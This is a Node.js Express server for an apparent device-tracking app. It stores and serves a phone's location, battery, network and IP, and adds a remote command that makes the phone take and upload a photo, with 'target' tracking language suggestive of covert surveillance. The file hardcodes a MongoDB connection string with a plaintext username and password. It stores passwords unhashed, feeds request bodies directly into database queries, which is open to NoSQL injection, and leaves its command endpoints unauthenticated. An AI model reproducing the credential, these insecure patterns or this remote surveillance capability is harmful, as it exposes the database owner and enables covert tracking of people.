const express = require('express');
const cors = require('cors');
const path = require('path');
const mongoose = require('mongoose');
require('dotenv').config();

const Location = require('./models/Location');
const User = require('./models/User');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json({ limit: '10mb' })); // Photo ke liye limit
app.use(express.static(path.join(__dirname, 'frontend')));

const mongoURI = process.env.MONGO_URI || "mongodb+srv://priyanshurajthakur5634_db_user:6SO3JcNKgDLWjwhm@cluster0.yb3flx7.mongodb.net/SecureTraceDB?retryWrites=true&w=majority"; 
mongoose.connect(mongoURI).then(() => console.log("[+] DATABASE CONNECTED!")).catch(err => console.log("[-] DATABASE FAILED:", err));

app.post('/api/register', async (req, res) => {
    try {
        const { username, password, deviceId } = req.body;
        const existingUser = await User.findOne({ username });
        if (existingUser) return res.status(400).json({ success: false, message: "Username already exists!" });
        const newUser = new User({ username, password, deviceId });
        await newUser.save();
        res.json({ success: true, message: "Account created!" });
    } catch (error) { res.status(500).json({ success: false, message: "Error" }); }
});

app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        const user = await User.findOne({ username, password });
        if (user) res.json({ success: true, deviceId: user.deviceId });
        else res.status(401).json({ success: false, message: "Invalid Credentials!" });
    } catch (error) { res.status(500).json({ success: false, message: "Error" }); }
});

app.post('/api/update-location', async (req, res) => {
    try {
        const { deviceId, lat, lng, accuracy, battery, network, ipAddress } = req.body;
        const newLocation = new Location({ deviceId, latitude: lat, longitude: lng, accuracy, battery, network, ipAddress });
        await newLocation.save();
        res.json({ success: true });
    } catch (error) { res.status(500).json({ success: false }); }
});

app.post('/api/get-location', async (req, res) => {
    try {
        const { deviceId } = req.body;
        const latestLocation = await Location.findOne({ deviceId }).sort({ timestamp: -1 });
        if (latestLocation) {
            res.json({
                lat: parseFloat(latestLocation.latitude), lng: parseFloat(latestLocation.longitude),
                accuracy: parseFloat(latestLocation.accuracy), battery: latestLocation.battery || "Unknown",
                network: latestLocation.network || "Unknown", ipAddress: latestLocation.ipAddress || "Detecting...",
                photoUrl: latestLocation.photoUrl || "", status: "LIVE TRACKING ACTIVE"
            });
        } else { res.json({ status: "TARGET OFFLINE" }); }
    } catch (error) { res.status(500).json({ status: "ERROR" }); }
});

// =====================================
// NAYA: ON-DEMAND CAMERA COMMAND SYSTEM
// =====================================

// Laptop command bhejega
app.post('/api/send-command', async (req, res) => {
    try {
        await User.findOneAndUpdate({ deviceId: req.body.deviceId }, { actionCommand: req.body.command });
        res.json({ success: true });
    } catch (err) { res.status(500).json({ success: false }); }
});

// Mobile baar-baar check karega ki koi command aayi kya
app.post('/api/check-command', async (req, res) => {
    try {
        const user = await User.findOne({ deviceId: req.body.deviceId });
        res.json({ command: user ? user.actionCommand : "NONE" });
    } catch (err) { res.status(500).json({ command: "NONE" }); }
});

// Mobile photo lene ke baad upload karega aur command clear karega
app.post('/api/upload-photo', async (req, res) => {
    try {
        const { deviceId, photoUrl } = req.body;
        const latest = await Location.findOne({ deviceId }).sort({ timestamp: -1 });
        if (latest) {
            latest.photoUrl = photoUrl;
            await latest.save();
        }
        await User.findOneAndUpdate({ deviceId }, { actionCommand: "NONE" });
        res.json({ success: true });
    } catch (err) { res.status(500).json({ success: false }); }
});

app.use((req, res) => { res.sendFile(path.join(__dirname, 'frontend', 'index.html')); });
app.listen(PORT, () => console.log(`[+] SYSTEM ONLINE ON PORT ${PORT}`));
